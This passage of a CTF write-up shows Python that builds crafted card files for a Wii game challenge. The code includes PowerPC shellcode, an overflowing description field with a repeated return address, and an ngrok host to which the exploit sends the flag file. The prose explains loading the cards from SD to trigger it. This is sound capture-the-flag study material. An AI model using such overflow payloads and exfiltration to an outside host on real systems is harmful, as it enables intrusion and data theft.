+<span class="line"><span style="color:#DBD7CAEE">shellcode </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x3c\x60\x90\x79\x60\x63\x97\x18\x7c\x84\x22\x78\x38\x84\x01\x01\x70\x84\xf0\xff\x3d\x80\x80\x10\x61\x8c\x7d\xe4\x7d\x89\x03\xa6\x4e\x80\x04\x21\x7c\x7f\x1b\x78\x7f\xe3\xfb\x78\x3c\x80\x90\x79\x60\x84\x97\x60\x7c\xa5\x2a\x78\x38\xa5\x01\x01\x70\xa5\xff\xf0\x3d\x80\x80\x10\x61\x8c\x7e\xd4\x7d\x89\x03\xa6\x4e\x80\x04\x21\x3c\x60\x90\x79\x60\x63\x97\x22\x7c\x84\x22\x78\x7c\x84\x22\x78\x38\x84\x28\x83\x3c\xa0\x90\x79\x60\xa5\x97\x60\x7c\xc6\x32\x78\x38\xc6\x01\x01\x70\xc6\xff\xf0\x7d\x8c\x62\x78\x3d\x8c\x81\x10\x61\x8c\xc9\x74\x7d\x6b\x5a\x78\x3d\x6b\x01\x10\x7d\x6c\x62\x78\x7d\x89\x03\xa6\x4e\x80\x04\x21</span><span style="color:#C98A7D77">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># Create the output directory if it doesn't exist</span></span>
+<span class="line"><span style="color:#DBD7CAEE">os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">makedirs</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">out_path</span><span style="color:#666666">,</span><span style="color:#BD976A"> exist_ok</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">dns </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">6.tcp.eu.ngrok.io</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">urlcard </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Card</span><span style="color:#666666">(</span></span>
+<span class="line"><span style="color:#BD976A">    id</span><span style="color:#666666">=</span><span style="color:#4C9A91">778</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    texture</span><span style="color:#666666">=</span><span style="color:#B8A965">open</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">graphics_source1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">rb</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">read</span><span style="color:#666666">(),</span></span>
+<span class="line"><span style="color:#BD976A">    card_type</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">CardType</span><span style="color:#666666">.</span><span style="color:#C99076">MONSTER</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    name</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/sys/flag</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    description</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> dns</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#666666"> (</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">200</span><span style="color:#CB7676"> -</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">dns</span><span style="color:#666666">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">),</span></span>
+<span class="line"><span style="color:#BD976A">    attack</span><span style="color:#666666">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    defense</span><span style="color:#666666">=</span><span style="color:#4C9A91">0</span></span>
+<span class="line"><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">exploit </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Card</span><span style="color:#666666">(</span></span>
+<span class="line"><span style="color:#BD976A">    id</span><span style="color:#666666">=</span><span style="color:#4C9A91">777</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    texture</span><span style="color:#666666">=</span><span style="color:#B8A965">open</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">graphics_source2</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">rb</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">read</span><span style="color:#666666">(),</span></span>
+<span class="line"><span style="color:#BD976A">    card_type</span><span style="color:#666666">=</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    name</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Exploit</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
+<span class="line"><span style="color:#BD976A">    description</span><span style="color:#666666">=</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">AAA</span><span style="color:#C99076">\xFF</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> shellcode </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#666666">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">811503a4</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#666666"> (</span><span style="color:#4C9A91">104</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">),</span></span>
+<span class="line"><span style="color:#BD976A">    attack</span><span style="color:#666666">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> </span></span>
+<span class="line"><span style="color:#BD976A">    defense</span><span style="color:#666666">=</span><span style="color:#4C9A91">0</span></span>
+<span class="line"><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># Serialize the card to binary</span></span>
+<span class="line"><span style="color:#DBD7CAEE">output_path </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">out_path</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#4C9A91">778</span><span style="color:#C99076">}</span><span style="color:#C98A7D">.bin"</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">urlcard</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">serializeToBinary</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">output_path</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># Serialize the card to binary</span></span>
+<span class="line"><span style="color:#DBD7CAEE">output_path </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">out_path</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#4C9A91">777</span><span style="color:#C99076">}</span><span style="color:#C98A7D">.bin"</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">exploit</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">serializeToBinary</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">output_path</span><span style="color:#666666">)</span></span>
+<span class="line"></span></code></pre>
+<h2 id="putting-it-all-together">Putting it all together</h2>
+<p>Finally, we can put the cards in the SD folder that the game uses (<code>/apps/forsaken_tower/content/</code>)</p>
+<p>Then, when the game is in the main menu, we press B on “Get New Cards”</p>
+<p><img src="/writeup_files/forsaken-tower/main_menu.png" alt="main_menu"></p>
+<p>Then we press B again on “Check SD Card”</p>
+<p><img src="/writeup_files/forsaken-tower/get_cards.png" alt="get_cards"></p>
+<p>Now the cards are loaded and saved in the Wii NAND at <code>/title/12345678/00000002/content/</code> and can be loaded to be rendered in their full glory.</p>
+<p>Going to “Your Deck”, you can see builtin cards together with your custom cards from the SD and, if any, cards downloaded from the game servers. In the following screenshot, for example, we can see the card with relevant strings being rendered to the player. As an easter egg, I included the image of a ATM bus (ATM is the public transportation company in Milano). When you press left on the DPAD, the game will try to load the exploit card, executing the arbitrary shellcode and sending you the flag.</p>
+<p><img src="/writeup_files/forsaken-tower/strings_card.png" alt="strings_card"></p>
+<p>And sure enough, after running the exploit, we get the flag on our endpoint.</p>
+<p><img src="/writeup_files/forsaken-tower/flag.jpeg" alt="flag"></p>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
+&copy; 2025 Tower of Hanoi. All rights reserved.
+<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>
